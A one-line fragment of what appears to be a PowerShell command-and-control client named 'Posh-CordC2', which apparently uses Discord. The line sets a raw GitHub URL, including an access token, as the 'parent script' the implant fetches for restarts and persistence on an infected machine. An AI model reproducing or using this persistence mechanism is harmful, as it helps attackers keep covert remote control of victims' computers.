...
$parent = "https://raw.githubusercontent.com/Eltechno2/Posh-CordC2/refs/heads/main/Discord-C2-Client.ps1?token=GHSAT0AAAAAACX5VJFEXCM462ZOKMEMDRRWZXR5HSQ" # parent script URL (for restarts and persistance)
